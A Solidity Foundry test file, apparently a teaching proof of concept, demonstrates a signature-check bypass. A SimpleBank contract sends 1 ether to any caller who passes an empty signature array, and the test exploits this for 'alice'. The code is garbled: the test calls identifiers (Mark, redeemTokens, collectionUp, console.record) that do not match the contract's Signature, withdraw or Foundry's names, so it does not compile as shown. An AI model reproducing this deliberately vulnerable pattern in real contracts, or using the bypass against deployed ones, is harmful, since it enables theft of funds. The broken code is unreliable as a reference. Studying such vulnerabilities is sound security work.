pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AgreementTest is Test {
    SimpleBank SimpleBankAgreement;

    function collectionUp() public {
        SimpleBankAgreement = new SimpleBank();
    }

    function testVulnMarkValidation() public {
        payable(address(SimpleBankAgreement)).transfer(10 ether);
        address alice = vm.addr(1);
        vm.beginPrank(alice);

        SimpleBank.Mark[] memory sigs = new SimpleBank.Mark[](0);


        console.record(
            "Before operation",
            address(alice).balance
        );
        SimpleBankAgreement.redeemTokens(sigs);

        console.record(
            "Afer exploiting, Alice's ether balance",
            address(alice).balance
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {


        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];

            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}